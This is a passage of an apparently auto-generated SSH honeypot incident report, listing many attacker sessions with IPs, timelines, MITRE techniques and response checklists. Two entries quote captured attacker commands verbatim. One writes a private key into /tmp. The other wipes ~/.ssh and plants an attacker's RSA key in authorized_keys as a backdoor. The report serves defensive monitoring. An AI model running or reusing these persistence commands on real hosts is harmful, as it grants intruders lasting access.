| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; cd /tmp || cd /var/tmp || cd /dev/shm; echo '-----BEGIN OPENSSH PRIVATE KEY-----; b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW; QyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxgAAAJAt8FDRLfBQ; 0QAAAAtzc2gtZWQyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxg; AAAEAr1wl+3JHkjA3ZtPtjd8bAtLVFo13eZ12Aw2QnFXC/ie94S34m0hVkYFUhtWQe92S9; Cp0yJp+7n8gw696Uf/LGAAAACGRsckBzZnRwAQIDBAU=; -----END OPENSSH PRIVATE KEY-----' > key.p` |
| **Download Attempts** | ae8d459595257f2f22c9d1ff74c4fb8a91643fad7899b57556496716692b904e, 0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca |
| **Malware Analysis** | 0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 17:48:51` | `cowrie.session.connect` |
| `2026-08-22 17:48:51` | `cowrie.client.version` |
| `2026-08-22 17:48:51` | `cowrie.client.kex` |
| `2026-08-22 17:48:51` | `cowrie.login.success` |
| `2026-08-22 17:48:53` | `cowrie.session.params` |
| `2026-08-22 17:48:53` | `cowrie.command.input` |
| `2026-08-22 17:48:53` | `cowrie.session.file_download` |
| `2026-08-22 17:48:53` | `cowrie.session.file_download` |
| `2026-08-22 17:48:53` | `cowrie.log.closed` |
| `2026-08-22 17:48:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]51` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]51` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e5d105958e9e

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-22 17:49 |
| **Last Seen** | 2026-08-22 17:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 17:49:44` | `cowrie.session.connect` |
| `2026-08-22 17:49:44` | `cowrie.client.version` |
| `2026-08-22 17:49:44` | `cowrie.client.kex` |
| `2026-08-22 17:49:45` | `cowrie.login.success` |
| `2026-08-22 17:49:45` | `cowrie.direct-tcpip.request` |
| `2026-08-22 17:49:45` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-22 17:49:45` | `cowrie.direct-tcpip.data` |
| `2026-08-22 17:49:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d88bfce21cd2

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-22 17:50 |
| **Last Seen** | 2026-08-22 17:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 17:50:08` | `cowrie.session.connect` |
| `2026-08-22 17:50:08` | `cowrie.client.version` |
| `2026-08-22 17:50:08` | `cowrie.client.kex` |
| `2026-08-22 17:50:09` | `cowrie.login.success` |
| `2026-08-22 17:50:09` | `cowrie.direct-tcpip.request` |
| `2026-08-22 17:50:09` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-22 17:50:09` | `cowrie.direct-tcpip.data` |
| `2026-08-22 17:50:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f1f7001e1284

| Field | Detail |
|---|---|
| **Source IP** | `42.248.129[.]234` |
| **First Seen** | 2026-08-22 17:52 |
| **Last Seen** | 2026-08-22 17:53 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 17:52:53` | `cowrie.session.connect` |
| `2026-08-22 17:52:54` | `cowrie.client.version` |
| `2026-08-22 17:52:54` | `cowrie.client.kex` |
| `2026-08-22 17:52:56` | `cowrie.login.success` |
| `2026-08-22 17:52:57` | `cowrie.direct-tcpip.request` |
| `2026-08-22 17:53:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `42.248.129[.]234` to AbuseIPDB if not already reported
- [ ] Block `42.248.129[.]234` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-794e5c15460e

| Field | Detail |
|---|---|
| **Source IP** | `115.68.133[.]201` |
| **First Seen** | 2026-08-22 17:53 |
| **Last Seen** | 2026-08-22 17:53 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 17:53:02` | `cowrie.session.connect` |
| `2026-08-22 17:53:03` | `cowrie.client.version` |
| `2026-08-22 17:53:03` | `cowrie.client.kex` |
| `2026-08-22 17:53:05` | `cowrie.login.success` |
| `2026-08-22 17:53:06` | `cowrie.direct-tcpip.request` |
| `2026-08-22 17:53:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.68.133[.]201` to AbuseIPDB if not already reported
- [ ] Block `115.68.133[.]201` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bcb0de676337

| Field | Detail |
|---|---|
| **Source IP** | `187.115.144[.]103` |
| **First Seen** | 2026-08-22 17:54 |
| **Last Seen** | 2026-08-22 17:54 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 17:54:38` | `cowrie.session.connect` |
| `2026-08-22 17:54:39` | `cowrie.client.version` |
| `2026-08-22 17:54:39` | `cowrie.client.kex` |
| `2026-08-22 17:54:41` | `cowrie.login.success` |
| `2026-08-22 17:54:42` | `cowrie.direct-tcpip.request` |
| `2026-08-22 17:54:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.115.144[.]103` to AbuseIPDB if not already reported
- [ ] Block `187.115.144[.]103` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea8c100865f2

| Field | Detail |
|---|---|
| **Source IP** | `210.0.90[.]81` |
| **First Seen** | 2026-08-22 17:54 |
| **Last Seen** | 2026-08-22 17:54 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 17:54:47` | `cowrie.session.connect` |
| `2026-08-22 17:54:48` | `cowrie.client.version` |
| `2026-08-22 17:54:48` | `cowrie.client.kex` |
| `2026-08-22 17:54:50` | `cowrie.login.success` |
| `2026-08-22 17:54:51` | `cowrie.direct-tcpip.request` |
| `2026-08-22 17:54:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.0.90[.]81` to AbuseIPDB if not already reported
- [ ] Block `210.0.90[.]81` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c9389ac17f9

| Field | Detail |
|---|---|
| **Source IP** | `182.60.128[.]241` |
| **First Seen** | 2026-08-22 17:54 |
| **Last Seen** | 2026-08-22 17:55 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 17:54:54` | `cowrie.session.connect` |
| `2026-08-22 17:54:55` | `cowrie.client.version` |
| `2026-08-22 17:54:55` | `cowrie.client.kex` |
| `2026-08-22 17:54:57` | `cowrie.login.success` |
| `2026-08-22 17:54:57` | `cowrie.direct-tcpip.request` |
| `2026-08-22 17:55:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.60.128[.]241` to AbuseIPDB if not already reported
- [ ] Block `182.60.128[.]241` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-93a3fe449091

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-22 17:59 |
| **Last Seen** | 2026-08-22 17:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 17:59:42` | `cowrie.session.connect` |
| `2026-08-22 17:59:42` | `cowrie.client.version` |
| `2026-08-22 17:59:43` | `cowrie.client.kex` |
| `2026-08-22 17:59:43` | `cowrie.login.success` |
| `2026-08-22 17:59:44` | `cowrie.direct-tcpip.request` |
| `2026-08-22 17:59:44` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-22 17:59:44` | `cowrie.direct-tcpip.data` |
| `2026-08-22 17:59:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-06de17e1f122

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-22 18:00 |
| **Last Seen** | 2026-08-22 18:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 18:00:08` | `cowrie.session.connect` |
| `2026-08-22 18:00:08` | `cowrie.client.version` |
| `2026-08-22 18:00:08` | `cowrie.client.kex` |
| `2026-08-22 18:00:09` | `cowrie.login.success` |
| `2026-08-22 18:00:09` | `cowrie.direct-tcpip.request` |
| `2026-08-22 18:00:09` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-22 18:00:09` | `cowrie.direct-tcpip.data` |
| `2026-08-22 18:00:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-567622452bd1

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-22 18:09 |
| **Last Seen** | 2026-08-22 18:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 18:09:39` | `cowrie.session.connect` |
| `2026-08-22 18:09:39` | `cowrie.client.version` |
| `2026-08-22 18:09:39` | `cowrie.client.kex` |
| `2026-08-22 18:09:40` | `cowrie.login.success` |
| `2026-08-22 18:09:40` | `cowrie.direct-tcpip.request` |
| `2026-08-22 18:09:40` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-22 18:09:40` | `cowrie.direct-tcpip.data` |
| `2026-08-22 18:09:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c117b2653827

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-22 18:10 |
| **Last Seen** | 2026-08-22 18:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 18:10:08` | `cowrie.session.connect` |
| `2026-08-22 18:10:08` | `cowrie.client.version` |
| `2026-08-22 18:10:08` | `cowrie.client.kex` |
| `2026-08-22 18:10:09` | `cowrie.login.success` |
| `2026-08-22 18:10:09` | `cowrie.direct-tcpip.request` |
| `2026-08-22 18:10:10` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-22 18:10:10` | `cowrie.direct-tcpip.data` |
| `2026-08-22 18:10:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0faaa0e00565

| Field | Detail |
|---|---|
| **Source IP** | `194.59.245[.]3` |
| **First Seen** | 2026-08-22 18:12 |
| **Last Seen** | 2026-08-22 18:12 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 18:12:10` | `cowrie.session.connect` |
| `2026-08-22 18:12:10` | `cowrie.client.version` |
| `2026-08-22 18:12:10` | `cowrie.client.kex` |
| `2026-08-22 18:12:10` | `cowrie.login.success` |
| `2026-08-22 18:12:11` | `cowrie.direct-tcpip.request` |
| `2026-08-22 18:12:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `194.59.245[.]3` to AbuseIPDB if not already reported
- [ ] Block `194.59.245[.]3` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d2b0cd09d5aa

| Field | Detail |
|---|---|
| **Source IP** | `208.96.233[.]67` |
| **First Seen** | 2026-08-22 18:12 |
| **Last Seen** | 2026-08-22 18:12 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 18:12:15` | `cowrie.session.connect` |
| `2026-08-22 18:12:16` | `cowrie.client.version` |
| `2026-08-22 18:12:16` | `cowrie.client.kex` |
| `2026-08-22 18:12:17` | `cowrie.login.success` |
| `2026-08-22 18:12:17` | `cowrie.direct-tcpip.request` |
| `2026-08-22 18:12:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `208.96.233[.]67` to AbuseIPDB if not already reported
- [ ] Block `208.96.233[.]67` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0fbb5bc7ac30

| Field | Detail |
|---|---|
| **Source IP** | `111.70.32[.]8` |
| **First Seen** | 2026-08-22 18:17 |
| **Last Seen** | 2026-08-22 18:17 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 18:17:00` | `cowrie.session.connect` |
| `2026-08-22 18:17:01` | `cowrie.client.version` |
| `2026-08-22 18:17:01` | `cowrie.client.kex` |
| `2026-08-22 18:17:03` | `cowrie.login.success` |
| `2026-08-22 18:17:04` | `cowrie.direct-tcpip.request` |
| `2026-08-22 18:17:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.32[.]8` to AbuseIPDB if not already reported
- [ ] Block `111.70.32[.]8` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f4b9e2f26dba

| Field | Detail |
|---|---|
| **Source IP** | `222.76.248[.]54` |
| **First Seen** | 2026-08-22 18:17 |
| **Last Seen** | 2026-08-22 18:17 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 18:17:14` | `cowrie.session.connect` |
| `2026-08-22 18:17:15` | `cowrie.client.version` |
| `2026-08-22 18:17:15` | `cowrie.client.kex` |
| `2026-08-22 18:17:17` | `cowrie.login.success` |
| `2026-08-22 18:17:18` | `cowrie.direct-tcpip.request` |
| `2026-08-22 18:17:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.76.248[.]54` to AbuseIPDB if not already reported
- [ ] Block `222.76.248[.]54` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a768080cb98

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-22 18:19 |
| **Last Seen** | 2026-08-22 18:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 18:19:33` | `cowrie.session.connect` |
| `2026-08-22 18:19:33` | `cowrie.client.version` |
| `2026-08-22 18:19:33` | `cowrie.client.kex` |
| `2026-08-22 18:19:34` | `cowrie.login.success` |
| `2026-08-22 18:19:35` | `cowrie.direct-tcpip.request` |
| `2026-08-22 18:19:35` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-22 18:19:35` | `cowrie.direct-tcpip.data` |
| `2026-08-22 18:19:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ffcb8a7c2043

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-22 18:20 |
| **Last Seen** | 2026-08-22 18:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 18:20:03` | `cowrie.session.connect` |
| `2026-08-22 18:20:03` | `cowrie.client.version` |
| `2026-08-22 18:20:03` | `cowrie.client.kex` |
| `2026-08-22 18:20:04` | `cowrie.login.success` |
| `2026-08-22 18:20:05` | `cowrie.direct-tcpip.request` |
| `2026-08-22 18:20:05` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-22 18:20:05` | `cowrie.direct-tcpip.data` |
| `2026-08-22 18:20:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e8b76d1c7745

| Field | Detail |
|---|---|
| **Source IP** | `125.215.52[.]45` |
| **First Seen** | 2026-08-22 18:26 |
| **Last Seen** | 2026-08-22 18:26 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 18:26:37` | `cowrie.session.connect` |
| `2026-08-22 18:26:37` | `cowrie.client.version` |
| `2026-08-22 18:26:37` | `cowrie.client.kex` |
| `2026-08-22 18:26:38` | `cowrie.login.success` |
| `2026-08-22 18:26:40` | `cowrie.session.params` |
| `2026-08-22 18:26:40` | `cowrie.command.input` |
| `2026-08-22 18:26:40` | `cowrie.command.failed` |
| `2026-08-22 18:26:40` | `cowrie.log.closed` |
| `2026-08-22 18:26:41` | `cowrie.session.params` |
| `2026-08-22 18:26:41` | `cowrie.command.input` |
| `2026-08-22 18:26:41` | `cowrie.session.file_download` |
| `2026-08-22 18:26:41` | `cowrie.log.closed` |
| `2026-08-22 18:26:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.215.52[.]45` to AbuseIPDB if not already reported
- [ ] Block `125.215.52[.]45` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba55f2a5831c

| Field | Detail |
|---|---|
| **Source IP** | `125.215.52[.]45` |
| **First Seen** | 2026-08-22 18:26 |
| **Last Seen** | 2026-08-22 18:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 18:26:42` | `cowrie.session.connect` |
| `2026-08-22 18:26:42` | `cowrie.client.version` |
| `2026-08-22 18:26:42` | `cowrie.client.kex` |
| `2026-08-22 18:26:43` | `cowrie.login.success` |
| `2026-08-22 18:26:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.215.52[.]45` to AbuseIPDB if not already reported
- [ ] Block `125.215.52[.]45` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b45992711274

| Field | Detail |
|---|---|
| **Source IP** | `125.215.52[.]45` |
| **First Seen** | 2026-08-22 18:26 |
| **Last Seen** | 2026-08-22 18:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 18:26:43` | `cowrie.session.connect` |
| `2026-08-22 18:26:43` | `cowrie.client.version` |
| `2026-08-22 18:26:44` | `cowrie.client.kex` |
| `2026-08-22 18:26:45` | `cowrie.login.success` |
| `2026-08-22 18:26:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.215.52[.]45` to AbuseIPDB if not already reported
- [ ] Block `125.215.52[.]45` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-60d203e00fe4

| Field | Detail |
|---|---|
| **Source IP** | `38.224.56[.]103` |
| **First Seen** | 2026-08-22 18:26 |
| **Last Seen** | 2026-08-22 18:27 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 18:26:57` | `cowrie.session.connect` |
| `2026-08-22 18:27:00` | `cowrie.client.version` |
| `2026-08-22 18:27:00` | `cowrie.client.kex` |
| `2026-08-22 18:27:06` | `cowrie.login.success` |
| `2026-08-22 18:27:07` | `cowrie.direct-tcpip.request` |
| `2026-08-22 18:27:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.224.56[.]103` to AbuseIPDB if not already reported
- [ ] Block `38.224.56[.]103` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d7e26c9b9393

| Field | Detail |
|---|---|
| **Source IP** | `78.187.230[.]168` |
| **First Seen** | 2026-08-22 18:27 |
| **Last Seen** | 2026-08-22 18:27 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 18:27:08` | `cowrie.session.connect` |
| `2026-08-22 18:27:08` | `cowrie.client.version` |
| `2026-08-22 18:27:08` | `cowrie.client.kex` |
| `2026-08-22 18:27:10` | `cowrie.login.success` |
| `2026-08-22 18:27:10` | `cowrie.direct-tcpip.request` |
| `2026-08-22 18:27:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `78.187.230[.]168` to AbuseIPDB if not already reported
